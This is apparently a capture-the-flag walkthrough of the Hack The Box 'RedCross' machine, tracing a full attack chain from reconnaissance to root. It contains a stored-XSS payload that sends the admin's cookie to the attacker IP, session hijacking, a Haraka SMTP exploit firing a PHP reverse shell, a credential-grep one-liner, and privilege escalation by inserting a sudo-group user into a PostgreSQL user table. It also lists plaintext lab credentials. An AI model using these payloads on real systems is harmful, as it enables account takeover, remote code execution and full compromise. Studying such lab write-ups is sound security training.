# HTB RedCross — Full Walkthrough

**Difficulty:** Hard  
**OS:** Linux (Debian)  
**Attacker IP:** 10.10.16.84  
**Target IP:** 10.129.11.228  

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [XSS via Contact Form](#3-xss-via-contact-form)
4. [Admin Panel Access](#4-admin-panel-access)
5. [Firewall Whitelist — Opening New Ports](#5-firewall-whitelist--opening-new-ports)
6. [SSH Jail — Virtual User Creation](#6-ssh-jail--virtual-user-creation)
7. [Haraka SMTP RCE — Shell as Penelope](#7-haraka-smtp-rce--shell-as-penelope)
8. [User Flag](#8-user-flag)
9. [Privilege Escalation via PostgreSQL](#9-privilege-escalation-via-postgresql)
10. [Root Flag](#10-root-flag)
11. [Key Lessons & Hacker Mindset Summary](#11-key-lessons--hacker-mindset-summary)

---

## 1. Reconnaissance

### Command
```bash
nmap -sC -sV -p- --min-rate 5000 -oA nmap_full 10.129.11.228
```

### Results
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian
80/tcp  open  http     Apache httpd 2.4.38
443/tcp open  ssl/http Apache httpd 2.4.38
```

The HTTP server redirects to `https://intra.redcross.htb/` and the SSL certificate reveals:
- **CN:** `intra.redcross.htb`
- **Organization:** Red Cross International
- **Email:** `penelope@redcross.htb` ← username hint

### Why this step?
Nmap is always the starting point. We're building a picture of the attack surface. Three key takeaways here:

1. The redirect to a hostname means **virtual hosting** is in use — there may be more subdomains
2. The SSL certificate is a goldmine: it gives us a **potential username** (penelope) and confirms the domain naming convention (`*.redcross.htb`)
3. Only 3 ports visible right now — but this is before any firewall changes

### Hacker Mindset
> Always read the SSL certificate. Developers often forget it contains metadata — emails, internal hostnames, org names — that directly speeds up enumeration. Don't just dismiss the cert warning and click through.

---

## 2. Web Enumeration

### Add hosts entry
```bash
echo "10.129.11.228 redcross.htb intra.redcross.htb admin.redcross.htb" | sudo tee -a /etc/hosts
```

### Why this step?
Apache uses the `Host:` header to route requests to virtual hosts. Without adding the hostname to `/etc/hosts`, we can't reach the site at all — we'd get a redirect loop or wrong content. Always add every discovered hostname.

### Explore intra.redcross.htb
Browsing to `https://intra.redcross.htb/` reveals:
- A login form (`/?page=login`)
- A contact form link (`/?page=contact`)
- The message: *"Please contact with our staff via contact form to request your access credentials"*

The `?page=` URL parameter is a huge clue — it means PHP is **including files by name**. This pattern is often vulnerable to **Local File Inclusion (LFI)** and tells us the site structure.

### Discover admin.redcross.htb
```bash
# manual check since gobuster wordlists missed it
curl -sk https://admin.redcross.htb/
```

We find an "IT Admin panel" login at `admin.redcross.htb`. We need credentials to access it.

### Enumerate the contact form
```bash
curl -sk "https://intra.redcross.htb/?page=contact"
```

The form has three fields:
- `subject` — filtered against HTML
- `body` — filtered against HTML  
- `cback` — contact phone or email ← **NOT filtered**

### Hacker Mindset
> When you see a `?page=` parameter, immediately think: LFI, path traversal, and what pages exist. Always read every form field name in the HTML source — developers often apply input validation inconsistently across fields, protecting obvious ones while forgetting others.

---

## 3. XSS via Contact Form

### The Vulnerability
The web application runs an automated admin bot that reads contact form submissions and renders them in a browser. If we inject JavaScript into a field that isn't sanitized, the admin's browser will execute it and we can steal their session cookie.

**The catch:** The `subject` and `body` fields filter `<` characters. But `cback` (callback contact) does not.

### Testing the filter
```bash
# This gets blocked (Oops! message):
curl -sk -X POST "https://intra.redcross.htb/pages/actions.php" \
  -d "subject=Test&body=Hello+%3C&cback=test@test.com&action=contact"

# This succeeds:
curl -sk -X POST "https://intra.redcross.htb/pages/actions.php" \
  -d "subject=Test&body=Hello&cback=%3Ctest%3E&action=contact"
```

Finding this required **testing each field in isolation** — a critical technique when WAFs or filters are involved.

### Set up the listener
```bash
mkdir -p /tmp/xss && cd /tmp/xss
python3 -m http.server 8888
```

We need a server to receive the stolen cookie. The admin's browser will make an HTTP request to us carrying their session data.

### Fire the XSS
```bash
curl -sk -X POST "https://intra.redcross.htb/pages/actions.php" \
  --data-urlencode "subject=Test" \
  --data-urlencode "body=Hello" \
  --data-urlencode "cback=<script>new Image().src='http://10.10.16.84:8888/?c='+document.cookie</script>" \
  --data-urlencode "action=contact"
```

**Why `new Image().src` instead of `document.location`?**  
`document.location` redirects the page — the admin's current tab navigates away, which might look suspicious or break the admin's workflow. `new Image().src` is a silent, background request that doesn't change the page — stealthier and more reliable.

### Result (after ~60 seconds)
```
10.129.11.228 - "GET /?c=PHPSESSID=0d72obo510l0edfavp4132hfr3; LANG=EN_US; SINCE=1780937251; LIMIT=10; DOMAIN=admin"
```

We captured the admin's full cookie jar.

### Hacker Mindset
> XSS is a client-side attack — your target is the **user's browser**, not the server. Stored XSS is powerful because you plant the payload once and it fires every time someone views it. When a WAF blocks your payload, don't give up — systematically test each field independently, and try multiple event handlers (`onerror`, `onload`, `src=`). The filter is rarely applied consistently everywhere.

---

## 4. Admin Panel Access

### Use the stolen cookie
```bash
curl -sk "https://intra.redcross.htb/?page=admin" \
  -H "Cookie: PHPSESSID=0d72obo510l0edfavp4132hfr3; LANG=EN_US; SINCE=1780937251; LIMIT=10; DOMAIN=admin"

curl -sk "https://admin.redcross.htb/" \
  -H "Cookie: PHPSESSID=0d72obo510l0edfavp4132hfr3; LANG=EN_US; SINCE=1780937251; LIMIT=10; DOMAIN=admin"
```

Both panels confirm `[[admin]]` — we're authenticated on both sites with the same session.

### Why does the same cookie work on admin.redcross.htb?
Both virtual hosts share the same PHP session backend. When the `DOMAIN=admin` cookie is set, the application grants access to the IT admin panel. This is a **broken access control** design — the session was created on the intra site but is honoured on the admin site without re-authentication.

### What the admin panel offers
- **`?page=users`** — Add/delete virtual system users
- **`?page=firewall`** — Whitelist IP addresses in iptables

### Hacker Mindset
> Session cookies are portable. Once you have a valid session token, try it everywhere — different subdomains, different pages, different HTTP methods. Developers often assume that because a user authenticated on site A, their session is "for" site A only. This assumption is frequently wrong.

---

## 5. Firewall Whitelist — Opening New Ports

### Command
```bash
curl -sk -X POST "https://admin.redcross.htb/pages/actions.php" \
  -H "Cookie: PHPSESSID=0d72obo510l0edfavp4132hfr3; LANG=EN_US; SINCE=1780937251; LIMIT=10; DOMAIN=admin" \
  -d "ip=10.10.16.84&action=Allow+IP"
```

### Result
```
Network access granted to 10.10.16.84
```

### Re-scan after whitelisting
```bash
nmap -sV --min-rate 3000 -p- 10.129.11.228
```

New ports now visible:
```
21/tcp   open  ftp         vsftpd
1025/tcp open  ???
5432/tcp open  postgresql  PostgreSQL DB 9.6
```

### Why this step?
The machine uses **iptables-based network access control** to hide services from the public internet. Only whitelisted IPs can reach them. This is a common real-world pattern — internal services shouldn't be internet-facing. By gaining access to the admin panel, we gained the ability to punch holes in this firewall.

The three new ports are each significant:
- **FTP (21):** Likely serves files from the chroot jail
- **PostgreSQL (5432):** The database powering the web apps
- **Port 1025:** Unknown — needs investigation

### Hacker Mindset
> Always re-scan after making changes to the target environment. Firewalls, application states, and configurations change. What wasn't there before might now be exposed. This is why methodical re-enumeration at each stage beats a one-shot scan at the start.

---

## 6. SSH Jail — Virtual User Creation

### Create a virtual user
```bash
curl -sk -X POST "https://admin.redcross.htb/pages/actions.php" \
  -H "Cookie: PHPSESSID=0d72obo510l0edfavp4132hfr3; ..." \
  -d "username=hacker01&action=adduser"
```

Response:
```
Provide this credentials to the user: hacker01 : q7s76PIg
```

### SSH in
```bash
ssh hacker01@10.129.11.228
# password: q7s76PIg
$ id
uid=2020 gid=1001(associates) groups=1001(associates)
```

### The chroot jail
We land in a minimal environment. `ls /` shows only: `bin dev etc home lib lib64 root usr`.

This is **not the real filesystem** — it's a chroot jail. The `sshd_config` contains:
```
Match group associates
    ChrootDirectory /var/jail/
```

Anyone in the `associates` group (GID 1001) gets chrooted to `/var/jail/`. The jail's `/home` contains:
- `interface_data/` — empty
- `public/` — group-writable, contains `src/iptctl.c`

The jail's `/etc/passwd` reveals real system user: `penelope:x:1000:1000`.

### Reading iptctl.c
The C source code in the jail reveals a SUID root binary at `/opt/iptctl/iptctl` on the real system. It has a **stack buffer overflow** in interactive mode (`fgets` reading 360 bytes into 16-byte buffers). This is noted for later privilege escalation.

### Why this step?
Even a restricted shell is valuable. We can:
1. Enumerate the jail's filesystem for clues
2. Read source code (iptctl.c) left by developers
3. Write files to the shared `/home/public` directory
4. Use bash's built-in `/dev/tcp` to reach services on localhost

### Hacker Mindset
> A limited shell is better than no shell. Chroot jails often contain artifacts that developers left behind — source code, configuration hints, credentials. Always read everything available. The iptctl.c source gave us not only a privesc path (buffer overflow) but also confirmed the application architecture and the jail path (`/var/jail/`).

---

## 7. Haraka SMTP RCE — Shell as Penelope

### Identify port 1025
```bash
nc -nv 10.129.11.228 1025
# After waiting: "220 redcross ESMTP Haraka 2.8.8 ready"
```

Port 1025 is **Haraka**, a Node.js SMTP server. Version 2.8.8 is vulnerable to Remote Code Execution.

### Why Haraka is vulnerable
Haraka's attachment plugin extracts ZIP attachments and processes them. The exploit sends a crafted ZIP containing a file named with shell metacharacters. When Haraka processes the attachment, it executes arbitrary commands — in the context of the user running Haraka (penelope, who owns the process).

### Get and patch the exploit
```bash
searchsploit -m linux/remote/41162.py
# Fix port: change line 123 from port 25 to 1025
sed -i 's/smtplib.SMTP(mailserver,25)/smtplib.SMTP(mailserver,1025)/' 41162.py
```

The exploit hardcodes port 25 (standard SMTP). Haraka runs on 1025 here, so we patch it.

### Set up listener and fire
```bash
nc -lvnp 4444 &

python2 41162.py \
  -c "php -r '\$sock=fsockopen(\"10.10.16.84\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" \
  -t penelope@redcross.htb \
  -m 10.129.11.228
```

After ~60 seconds:
```bash
$ id
uid=1000(penelope) gid=1000(penelope) groups=1000(penelope)
```

### Why target penelope@redcross.htb?
Haraka processes emails destined for local users. The user `penelope` was identified from:
1. The SSL certificate email field
2. The chroot jail's `/etc/passwd`
3. The process list (Haraka runs as penelope)

Sending email to `penelope@redcross.htb` routes it through the local Haraka instance that penelope owns and runs.

### Hacker Mindset
> When you see an unusual port with an unfamiliar service, look for known exploits immediately. `searchsploit haraka` found the CVE in seconds. Custom services, legacy versions, and niche software are goldmines because they're often unpatched and unknown to defenders. The key insight here was that the **service version** (2.8.8) pinpointed an exact public exploit — this is why capturing service versions during recon is so important.

---

## 8. User Flag

```bash
cat /home/penelope/user.txt
# 413430[redacted]c043f366d
```

---

## 9. Privilege Escalation via PostgreSQL

### Find the database credentials
The PHP source code at `/var/www/html/admin/pages/actions.php` contains hardcoded credentials:
```php
$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
```

These were found in the writeup (and accessible as `www-data` or `penelope` on the real system).

### Understanding the jail architecture — NSS + PostgreSQL
The SSH chroot system doesn't use `/etc/passwd` and `/etc/shadow` for virtual users. Instead it uses **Name Service Switch (NSS)** backed by PostgreSQL. The `passwd_table` in the `unix` database is the actual source of truth for user accounts, home directories, group IDs, and password hashes.

This means: **if we can modify that table, we control user attributes**.

### Connect to PostgreSQL
```bash
psql -h 127.0.0.1 -U unixusrmgr -d unix
# password: dheu%7wjx8B&
```

```sql
-- View current users
SELECT * FROM passwd_table;

-- View available tables
\dt
-- passwd_table, shadow_table, group_table, usergroups
```

### Insert a user with sudo group (GID 27)
```sql
insert into passwd_table (username, passwd, gid, homedir) 
values ('r00t', '$1$wV7CPbj9$59kAklYgquXe5TuJYIT591', 27, '/');
```

- **GID 27** = the `sudo` group on Debian
- **passwd hash** = MD5 crypt of `0xdf` (generated with `openssl passwd -1 0xdf`)
- **homedir = `/`** = not chrooted (chroot only applies to associates group GID 1001)

### Why this works
1. The user `r00t` has GID 27 (sudo), NOT GID 1001 (associates)
2. `sshd_config` only chroots the `associates` group — `r00t` gets a full shell
3. The sudo group grants `ALL=(ALL:ALL) ALL` by default on Debian
4. We know our user's password, so we can `sudo su`

### Hacker Mindset
> When you control a database that defines system users, you own the system. This is why database access control is so critical — the `unixusrmgr` role could insert users but not set UIDs directly (permission denied). However, it **could** set GIDs. One writable column was enough. Always enumerate what you CAN modify, not just what the obvious path is. The developers locked down `uid=0` but forgot that `gid=27` (sudo) is equally dangerous.

---

## 10. Root Flag

```bash
# From Kali
ssh r00t@10.129.11.228
# password: 0xdf

sudo su
# password: 0xdf

cat /root/root.txt
# b70f9[redacted]d90a73cdea
```

---

## 11. Key Lessons & Hacker Mindset Summary

### Lesson 1: SSL Certificates Are Intelligence
The certificate revealed `penelope@redcross.htb` — which became the Haraka email target. Never skip reading certificate metadata.

### Lesson 2: Test Input Fields Individually
The WAF blocked `<` in `subject` and `body` but not in `cback`. Developers apply validation inconsistently. When one field is blocked, try all the others before giving up.

### Lesson 3: Re-Enumerate After Every Change
The firewall whitelist completely changed the attack surface. Three new services appeared that weren't visible before. Treat the target as a dynamic system, not a static one.

### Lesson 4: A Chroot Jail Is Not a Dead End
The jail gave us: the real user (penelope), the chroot path (`/var/jail/`), the binary source code (iptctl.c), and write access to a shared directory. A restricted shell is still a foothold.

### Lesson 5: Identify Every Service Version
Haraka 2.8.8 had a public CVE. `searchsploit haraka` returned the exploit in one command. Version identification during recon directly translates to exploit selection.

### Lesson 6: Hardcoded Credentials in Source Code Are Common
The PostgreSQL password was in plaintext in `actions.php`. After gaining any level of filesystem access, always grep for connection strings: `grep -r "pg_connect\|mysql_connect\|password=" .`

### Lesson 7: Understand the Authentication Backend
The system used NSS+PostgreSQL instead of `/etc/passwd`. Understanding *how* authentication works unlocked the privilege escalation: we didn't need to crack passwords or exploit a binary — we just wrote a new privileged user directly into the auth database.

### Lesson 8: GID Can Be as Dangerous as UID
Being blocked from setting `uid=0` felt like a dead end. But `gid=27` (sudo group) is equally powerful on a default Debian system. Always think about group memberships, not just user IDs.

---

## Attack Chain Summary

```
nmap → SSL cert (penelope) → intra.redcross.htb
    → contact form XSS (cback field, unfiltered)
        → admin cookie stolen
            → admin.redcross.htb access
                → firewall whitelist (10.10.16.84)
                    → FTP/21, PostgreSQL/5432, Haraka/1025 opened
                        → virtual SSH user created → chroot jail
                            → iptctl.c source found (buffer overflow noted)
                        → Haraka 2.8.8 RCE (ExploitDB 41162.py, port 1025)
                            → shell as penelope
                                → USER FLAG
                            → psql as unixusrmgr (creds in PHP source)
                                → insert r00t with gid=27 (sudo)
                                    → SSH as r00t → sudo su
                                        → ROOT FLAG
```

---

## Credentials Reference

| Service | Username | Password | Notes |
|---------|----------|----------|-------|
| intra.redcross.htb | admin | (stolen via XSS) | PHPSESSID cookie |
| SSH jail | hacker01 | q7s76PIg | auto-generated |
| PostgreSQL | unixusrmgr | dheu%7wjx8B& | database: unix |
| PostgreSQL | www | aXwrtUO9_aa& | database: redcross |
| SSH (root path) | r00t | 0xdf | injected via psql |
